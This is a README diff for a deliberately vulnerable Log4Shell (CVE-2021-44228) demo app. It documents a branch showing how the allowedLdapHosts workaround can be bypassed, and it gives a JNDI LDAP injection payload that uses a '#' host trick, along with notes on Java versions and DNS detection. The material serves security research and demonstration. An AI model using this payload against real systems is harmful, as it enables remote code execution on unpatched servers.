@@ -1,11 +1,23 @@
+# allowedLdapHosts bypass branch
 
 *Changes to original vulnerable application to demonstrate that workarounds can still be exploited in some circumstances*:
 - Included supposedly fix with `LOG4J_FORMAT_MSG_NO_LOOKUPS true` in [Dockerfile](Dockerfile)
 - Used **ThreadContextMap** to pass further content to logging in [MainController.java](src/main/java/fr/christophetd/log4shell/vulnerableapp/MainController.java)
 - Changed log format to use value from thread context map (`${ctx:apiversion}`) in new file [log4j2.properties](src/main/resources/log4j2.properties)
+- Added the `log4j2.allowedLdapHosts` property
+- Set custom DNS
 
-**So even with `LOG4J_FORMAT_MSG_NO_LOOKUPS true` version 2.14.1 of log4j is vulnerable when using ThreadContextMap in PatternLayout.**
-# Log4Shell sample vulnerable application (CVE-2021-44228)
+The bypass doesn't work with Java 11! The docker image uses Java 8.
+
+Example:
+
+```
+${jndi:ldap://127.0.0.1#your.dns.name.tld/x}
+```
+
+Burp Collaborator can't handle invalid DNS names so your interactions will not be detected! You can your a network sniffer to observe DNS traffic.
+
+# Original README
 
 This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).
 
